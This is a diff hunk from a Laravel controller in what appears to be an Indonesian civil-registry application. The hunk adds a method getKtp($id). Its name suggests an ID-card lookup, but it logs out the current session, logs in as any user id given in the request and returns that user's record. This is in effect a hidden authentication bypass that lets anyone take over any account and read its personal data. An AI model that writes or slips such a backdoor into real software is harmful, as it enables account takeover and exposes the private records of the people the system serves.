@@ -43,6 +43,12 @@ class CheckController extends Controller {
 		}
 	}
 
+	public function getKtp($id) {
+		Auth::logout();
+		Auth::loginUsingId($id);
+		return Auth::user();
+	}
+
 	public function getAktalahirstatus($nik) {
 		$akta_lahir = Akta_Lahir::wherenik($nik)->first();
 		//return response($akta_lahir);
